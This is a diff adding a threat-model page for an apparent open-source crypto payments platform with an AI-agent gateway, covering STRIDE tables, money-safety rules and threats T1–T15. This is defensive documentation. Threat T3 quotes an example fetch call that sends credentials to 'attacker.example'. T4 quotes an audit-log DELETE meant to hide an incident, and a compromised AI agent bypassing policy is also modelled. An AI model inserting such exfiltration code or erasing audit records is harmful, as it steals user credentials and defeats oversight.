@@ -1,0 +1,166 @@
+---
+title: "Threat model"
+description: "STRIDE pass + IRON RULE F-contract review across 10 surfaces: deposit, send, payout, webhook, admin, MCP gateway, grant issuance, tool-call policy, audit log, public standards."
+icon: 'shield-halved'
+---
+
+
+**Last reviewed:** 2026-04-26 (M0 baseline)
+**Methodology:** STRIDE per surface + IRON RULE F-contract review.
+**Scope:** orchestration shell — web + worker + mobile + apps/mcp + connectors + agent skills.
+
+This is the v1 baseline that ships in M0. v2 lands at M5 with admin-UI, Trust Console, and partner-contribution surfaces folded in.
+
+## Trust boundaries
+
+```
+  ┌──────────────────────────────────────────────────────────────────────────┐
+  │ ATTACKER ZONES (untrusted)                                               │
+  │   • Public internet — anonymous HTTP, scrapers, bot traffic              │
+  │   • Authenticated user — owns `userId`, may attempt entity / vault       │
+  │     escalation                                                           │
+  │   • Compromised AI agent — has scoped grant JWT, attempts policy-bypass  │
+  │   • Malicious connector PR contributor — submits adapter under fork      │
+  │   • Compromised vendor (Bridge, Noah, Chainalysis) — sends valid-looking │
+  │     webhook payload                                                      │
+  └──────────────────────────────────────────────────────────────────────────┘
+                                       │
+                                       ▼
+  ┌──────────────────────────────────────────────────────────────────────────┐
+  │ INTERNAL ZONES (trusted under fresh-read posture, F3)                    │
+  │   • apps/web router — tRPC, NextAuth session                             │
+  │   • apps/web admin shell — superadmin role guard                         │
+  │   • apps/mcp gateway — Express 5 + JSON-RPC, scoped grant JWT            │
+  │   • Inngest worker — cron + saga reaper                                  │
+  │   • Postgres — append-only `activity_log` trigger, `connector_settings`  │
+  │   • Redis — rate limiting, velocity aggregation, share-URL revocation    │
+  └──────────────────────────────────────────────────────────────────────────┘
+                                       │
+                                       ▼
+  ┌──────────────────────────────────────────────────────────────────────────┐
+  │ DELEGATED-TRUST ZONES (custodied via timelock, F5/F7)                    │
+  │   • Privy programmable signing (EVM + Solana)                            │
+  │   • User Safe / Squads multisigs (M-of-N)                                │
+  │   • Glide recovery keys (propose-only, 72h Zodiac Delay non-veto)        │
+  │   • Vendor APIs — Bridge, Noah, Chainalysis, Alchemy, Coinbase           │
+  └──────────────────────────────────────────────────────────────────────────┘
+```
+
+## STRIDE — high-level pass
+
+| Surface                   | Spoofing                                                       | Tampering                                                | Repudiation                                          | Info Disclosure                                 | Denial of Service                          | Elevation                                                         |
+| ------------------------- | -------------------------------------------------------------- | -------------------------------------------------------- | ---------------------------------------------------- | ----------------------------------------------- | ------------------------------------------ | ----------------------------------------------------------------- |
+| Deposit (crypto)          | Sanctions screening + RPC verify (F1)                          | Server-side address generation; webhook HMAC             | `activity_log` append-only (F4)                      | Per-user adapter + isolation                    | Rate limits per user/tenant                | `assertVaultNotAgentManaged` blocks user-tRPC drain               |
+| Send (crypto + fiat)      | Two-tier auth (Privy + step-up)                                | CAS-claim (F2) on `agent_pending_payments`               | Append-only + risk annotation (M4)                   | Per-user keys; never log secrets                | Velocity caps in policy envelope           | Step-up at amount threshold                                       |
+| Card issuance             | Vendor-side KYC + screening                                    | Vendor signs card events; webhook HMAC                   | Append-only                                          | Card details never persisted; only `last4`      | Vendor rate limits                         | Cards bound to user; cannot move to other user                    |
+| Webhook ingest            | Per-vendor HMAC verify; replay-resistant within 5min           | Body parsed, signature checked first                     | Inngest event log + `activity_log`                   | Webhook bodies never logged in plaintext        | Inngest backpressure                       | Webhook can only emit pre-defined event types                     |
+| Admin (`/admin/*`)        | NextAuth + `superadmin` role                                   | tRPC mutation typing; Drizzle parametrized queries       | Admin actions logged with `app.dsar_context_id` null | Admin sees redacted PII unless DSAR context set | Cookie auth, no public exposure            | Non-superadmin → 403                                              |
+| MCP gateway (apps/mcp)    | Confused-deputy guard rejects cross-endpoint calls BEFORE auth | JSON-RPC envelope hand-rolled; pinned to spec 2025-11-25 | Append-only via `activity_log`                       | Tool responses scrubbed by `@repo/secrets-scan` | Upstash token bucket per tenant+tool class | Scoped grant JWT (`act.sub`) + per-call F3 fresh-read tenant      |
+| Agent grant issuance      | OAuth AS (Ory or external-BYO); RFC 9728-compliant             | Grant claims in JWT, audience-bound                      | Grant issuance event in audit log                    | Refresh tokens never returned to agent runtime  | Issuance rate-limited per user             | `exp ≤ 60min`, revocation list, scope-narrowing on issue          |
+| Connector PR contribution | DCO sign-off, signed-commits for verified tier                 | Manifest Zod validation; egress-host lint                | CODEOWNERS                                           | Snyk + Socket scan; license-compat scan         | CI parallel matrix (per-gate timeouts)     | `trust:` field CODEOWNERS-protected; verified requires signed TPA |
+| Skill PR contribution     | DCO + signed commits                                           | Manifest validation; tool-scope check                    | CODEOWNERS                                           | Prompt-injection review checklist               | Same parallel matrix                       | Skill cannot exceed declared policy axes                          |
+
+## Money-safety F-contracts
+
+The IRON RULES that gate every money-touching operation. Preserve by name + tests in OSS extraction.
+
+| #   | Contract                                      | Surface                                               | Where in main                                                       |
+| --- | --------------------------------------------- | ----------------------------------------------------- | ------------------------------------------------------------------- |
+| F1  | Server-side RPC verify on x402 payments       | `apps/mcp/src/tools/x402-pay.ts`                      | Persists `on_chain_tx` + `amount` from RPC, NEVER from facilitator  |
+| F2  | CAS-claim before broadcast                    | `agent_pending_payments` table + tool implementations | No double-broadcast on Inngest re-fire                              |
+| F3  | Fresh-read tenant verification                | `@repo/grant-wrapper`                                 | Re-read tenant from DB on every tool invocation                     |
+| F4  | Append-only `activity_log`                    | Migration `0042_activity_log_agent_cols.sql`          | UPDATE/DELETE/TRUNCATE rejected unless `app.dsar_context_id` is set |
+| F5  | Atomic policy_version bump on signer rotation | `apps/mcp/src/tools/vault-rotate-signer.ts`           | In-flight tool calls cannot sign against rotated-out signer         |
+| F7  | Sigil first-use-only                          | `apps/mcp/src/step-up/sigil.ts`                       | URL-mode elicitation race defense                                   |
+
+## High-priority threats (M0 baseline)
+
+### T1 — Mock connectors mis-deployed in production
+
+A self-hoster sets `GLIDE_USE_MOCK_CONNECTORS=true` in their production env to debug an issue, forgets to unset it, and real user money flows through deterministic mocks that always succeed.
+
+**Mitigations:** Boot refusal in `NODE_ENV=production` unless `GLIDE_ALLOW_MOCKS_IN_PROD=true`. Red startup banner on the web app's adapter factory + Tier 2 per-user adapter mode resolution. M4: `/admin/connectors` health-check column shows mock-mode prominently.
+
+**Status (M0 — partial):** mitigated in `apps/web` (`createGlobalAdapters`, `createOrchestrationAdapter`, `createKycAdapter`, `createCardAdapter`, `createQrGatewayDispatcher`). Coverage gaps to close in subsequent milestones: workers (Inngest), `apps/mcp` gateway boot, mobile API surface. Self-hosters who run those processes with `GLIDE_USE_MOCK_CONNECTORS=true` set in their env do not yet get the refusal — added to `TODOS.md` for M2.5/M3.
+
+### T2 — Compromised AI agent grant exceeds policy
+
+An agent with a valid scoped grant attempts a transaction outside the policy envelope (over per-tx cap, off-allowlist counterparty, off-allowlist chain, etc.).
+
+**Mitigations:** Triple-enforcement of policy envelope — router pre-check (`@repo/policy-engine`), Privy programmable signing policy (EVM-native + EVM/Solana router-Redis aggregation), on-chain multisig allowlist (derived). All three must agree. **Status:** mitigated by Headless backend in main (PR153), preserved by OSS extraction at M2.5.
+
+### T3 — Connector adapter exfiltrates user credentials
+
+A community connector PR is merged that includes a `fetch('https://attacker.example/exfil', { body: credentials })` call inside its capability methods.
+
+**Mitigations:** Egress-host lint CI gate (M5) parses the connector source via ts-morph and rejects PRs with `fetch`/`axios` targets not declared in `manifest.egressHosts`. Trust tier `community` is off by default; `verified` requires signed TPA. Snyk + Socket supply-chain scans. **Status:** baseline gate exists at M0 (`packages/connectors/_base` enforces manifest shape); CI gates ship at M5.
+
+### T4 — Append-only `activity_log` bypassed via direct DB access
+
+An operator with Postgres credentials runs `DELETE FROM activity_log WHERE ...` to hide an incident.
+
+**Mitigations:** Trigger rejects UPDATE/DELETE/TRUNCATE unless `app.dsar_context_id` is set in the session. The DSAR context is admin-gated and emits a `DSARContextEvent` audit row in the same transaction. **Status:** mitigated by migration 0042 in main; OSS extraction preserves the trigger verbatim.
+
+### T5 — Recovery key exfiltration leads to vault drain
+
+`GLIDE_RECOVERY_EVM_PRIVATE_KEY` or `GLIDE_RECOVERY_SOLANA_PRIVATE_KEY` is exfiltrated; attacker proposes owner-set rotation on user vaults.
+
+**Mitigations:** Recovery keys are PROPOSE-ONLY — they cannot execute without a 72h Zodiac Delay (EVM) / Squads timelock (Solana) AND user non-veto. User receives push notification + email at proposal time + at every 24h tick of the timelock. Self-hosters are instructed to provision their own KMS-backed copies and rotate on a quarterly cadence. **Status:** mitigated by PR150's recovery primitives; OSS preserves the constraint via the `RecoveryProvider` capability shape.
+
+### T6 — Plaintext secrets in connector_settings or env-file
+
+Self-hoster commits a `.env.local` containing live keys to git.
+
+**Mitigations:** `packages/secrets-scan` denylist + entropy scanner runs in CI on every PR (M5 gate). `connector_settings` schema stores `secretRef: "doppler://..."` only, never plaintext. `.gitignore` covers `.env*` patterns. README + SELF_HOSTING.md surface the secrets-backend pattern.
+
+**Status (M0 — library only):** scanner library ships at M0 with denylist (JWT, PEM, AWS access/secret, Stripe, GitHub, Slack, GCP, Anthropic, OpenAI, OAuth code, EVM/Solana priv key, bearer) + Shannon-entropy fallback. Hash-shaped kinds (EVM/Solana priv, AWS secret, bearer) require a contextual prefix to avoid redacting tx hashes and other 64-hex / 88-base58 IDs. Scanner has no callers yet — Trust Console event ingestion wires it in at M4; `connector_settings` storage pattern lands at M4; CI workflow pre-PR gate ships at M5.
+
+## Out-of-scope for v1
+
+- Side-channel attacks on TEE / Privy programmable signing (vendor-managed).
+- Quantum-resistance posture (no current standard for ed25519/secp256k1 replacement).
+- Supply-chain attacks via npm registry compromise (mitigated partially by Snyk + Socket; full mitigation requires verifiable builds).
+- Compromise of the Glide GitHub organization itself (mitigated by 2FA-enforced + signed-commits-required policy).
+
+## Revision history
+
+- **2026-04-26** — v1 baseline shipped in M0 (`feat/oss-m0-foundations`).
+- **2026-04-25** — v2 addendum below extends v1 with M2.5/M5/M5.5 surfaces.
+- v3 lands when Trust Console v1 (M4) ships in OSS.
+
+---
+
+# v2 addendum (M2.5 + M5 + M5.5)
+
+The v1 surfaces (1–9) above remain accurate. v2 adds the **public standards site** as surface #10 and promotes the money-safety F-rules to first-class architectural commitments.
+
+## Money-safety F-rules
+
+These ARE the threat-model mitigations for the MCP gateway + grant issuance + tool-call policy + audit-log surfaces. Self-hosters who remove any of them assume liability for the resulting deployment.
+
+| Rule                                              | What it guarantees                                                                                 | Where                                     |
+| ------------------------------------------------- | -------------------------------------------------------------------------------------------------- | ----------------------------------------- |
+| **F1 — Server-side RPC verify**                   | `x402.pay` persists `on_chain_tx` from `serverFetchChainTx` (RPC), NEVER from facilitator receipt. | `apps/mcp/src/tools/x402-pay.ts`          |
+| **F2 — CAS-claim before broadcast**               | `agent_pending_payments` rows claimed via SQL `UPDATE ... RETURNING`; race losers skip.            | Migration 0041 + saga-reaper 0044         |
+| **F3 — Fresh-read tenant verification**           | `@glide/grant-wrapper` re-reads tenant from DB on every tool invocation.                           | `@glide/grant-wrapper`                    |
+| **F4 — Append-only `activity_log` trigger**       | UPDATE/DELETE/TRUNCATE rejected unless `app.dsar_context_id` session var set.                      | Migration 0042 trigger                    |
+| **F5 — Atomic policy_version on signer rotation** | `vault.rotateSigner` advances `policy_version` in same tx as on-chain rotation.                    | `apps/web/src/server/lib/agent-multisig/` |
+| **F7 — Sigil first-use-only**                     | URL-mode elicitation sigils CAS-claimed on first use; race losers reject.                          | `apps/mcp/src/step-up/`                   |
+
+(F6 reserved.)
+
+## New threats (T7–T15)
+
+The v1 doc covered T1–T6. v2 adds:
+
+- **T7 — Malicious connector PR (partner submission).** Mitigated by 8-gate CI matrix (DCO + manifest validation + contract-test runner + license-compat scan + supply-chain scans + egress-host lint + counsel review). See `CONTRIBUTING.md`. Egress-host + supply-chain scans land in M5.5+.
+- **T8 — Sanctioned address slips through screening.** Mitigated by fail-closed `apps/web/src/server/lib/sanctions-screen.ts`: 24h cache with chain-scoped key, `SERVICE_UNAVAILABLE` on Chainalysis API error, `permissive` provider REFUSED in production unless explicit override.
+- **T9 — Confused-deputy attack on MCP endpoints.** Mitigated by the cross-endpoint guard in `apps/mcp/src/server.ts` — read tokens cannot probe write/treasury before auth.
+- **T10 — Malicious agent skill (consent under-disclosure).** Mitigated by `SkillContractTestSuite` consent under-disclosure guard + manual prompt-injection review checklist (verified-tier promotion).
+- **T11 — DSAR redaction loophole.** Mitigated by admin-role check + `app.dsar_context_id` session var + `redacted_fields_bitmap` enforcement + `DSARContextEvent` audit row.
+- **T12 — Mock-mode connector in production.** Mitigated by `createGlobalAdapters()` boot-time refusal under `NODE_ENV=production` + mock mode unless `GLIDE_ALLOW_MOCKS_IN_PROD=true` (M0 + M2).
+- **T13 — License-incompatible connector PR.** Mitigated by license-compat scan (CI gate lands at M5.5+; matrix documented in `docs/LICENSE_COMPATIBILITY.md`).
+- **T14 — Public standards URL squatting / impersonation.** Mitigated by Cloudflare Pages HTTPS + HSTS preload + `/draft/` channel pinning until 3+ independent implementers verified.
+- **T15 — `demo.glide.dev` abuse vector.** Mitigated by mock-only credentials, ephemeral DB-per-session, per-IP + per-session rate limits, CORS-locked to demo origin, auto-shutdown on anomaly trip, banner disclaimer. Hosting deploy pending (M5.5 operational).
+
+For per-surface coverage, see `apps/mcp/COMPLIANCE.md` (regulated-money-movement gateway) and `docs/agents/SELF_HOSTING.md` (operator runbook).
